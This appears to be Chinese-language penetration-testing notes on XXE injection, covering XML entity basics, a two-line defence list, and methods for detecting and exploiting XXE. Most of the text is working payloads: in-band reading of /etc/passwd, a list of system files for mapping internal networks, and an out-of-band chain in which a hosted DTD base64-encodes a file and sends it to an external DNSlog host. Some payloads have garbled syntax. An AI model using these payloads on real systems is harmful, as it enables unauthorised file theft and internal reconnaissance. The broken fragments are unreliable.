## **0x01 XML实体：**
实体(ENTITY)：在xml中可给数据取一个变量名，使用时调用变量名即可。
|     |普通/一般实体 |参数实体   |    
| --- | --- | --- | 
|内部定义 |!ELEMENT 实体名 “文本内容”| %实体名    |     
|外部定义(外部实体) |!ELEMENT 实体名 SYSTEM “外部文件/URL” |%实体名     |     
|引用方式 |&实体名 |%实体名    |     
|使用场合 | XML文档任意处，DTD中也可以    |只能在DTD的元素和属性声明中     |    

一般实体使用例子：
```
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/xml
Content-Length: [实际内容长度]

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
  <!ENTITY name "xxe">
]>
<request>
  <action>get_data</action>
  <parameters>
    <param1>&name;</param1>
    <param2>value2</param2>
  </parameters>
</request>
```

## **0x02 XXE定义：**
XXE发生在应用程序解XML输入时，没有禁止外部实体的加载导致可加载恶意外部文件，造成**文件读取**、内网端口扫描攻击内网网站(SSRF的一种)等。
PS：libxml 2.9.0以后的默认不解析外部实体，现在大多数为2.9.4版本，可测试站长是否开启了解析外部实体。
^
## **0x03 防范XXE：**
1. 禁用外部实体
2. 过滤关键词
        如：<!DOCTYPE <!ENTITY   
        如：SYSTEM

## **0x04 验证测试XXE：**

抓包，POST数据包里出现application/xml，text/xml，数据格式为xml，考虑是否有XXE。

### 1. 有回显XXE文件读取：
验证：修改POST请求数据包，自定义一个**一般的内部实体**，用内部实体即可验证是否存在XXE。
响应会引用实体，会回显“文本内容”，则验证成功。
```
外部实体注入文件读取：
<!ENTITY b SYSTEM "file///etc/passwd">
xml中引用&b

如：
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:urn="urn:examp <soapenv:Body>les:usernameservice">
 <soapenv:Header/>
 <urn:Username 
soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
>
 <username xsi:type="xsd:string">&test;</username>
 </urn:Username>
 </soapenv:Body>
</soapenv:Envelope>
响应有回显&test;的内容，即/etc/password




php伪协议编码读php源代码等文件:
“php//filter/.../index.php”


读java,go代码：
配合参数实体


请求内网：
读内网段是什么
/proc/net/arp
/etc/hosts
/etc/network/interfaces 高权限读
/proc/net/fib_trie
```

### 2.无回显XXE文件读取：
验证：修改请求数据包，自定义一个**外部实体+DNSlog**验证是否存在XXE。
响应会引用实体，请求DNSlog，DNSlog有记录，则验证成功。
PS：libxml 2.9.0以后的默认不解析外部实体，现在大多数为2.9.4版本，测试是否开启了解析外部实体。
```
无回显用携带进行进行文件读取：

自己服务器上放一个xxe.dtd文件，文件里面定义读文件的实体
该实体的变量作为另一个实体变量的DNSlog的url上参数值
引用，发起请求带出文件读取的内容。
```
xxe.dtd
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://2qytvx.ceye.io/?%file;'>">
```
注入点
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [
  <!ENTITY % remote SYSTEM "http://ip/xxe.dtd">
  %remote; %int; %send;
]>
<convert/>
```

^
^
只验证存在的话：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
        <!ENTITY % remote SYSTEM "2qytvx.ceye.io/xxe_test">
        %remote;
    ]
>
<root/>
```
get请求url最好全编码，而不是只有url路径编码。
<https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE>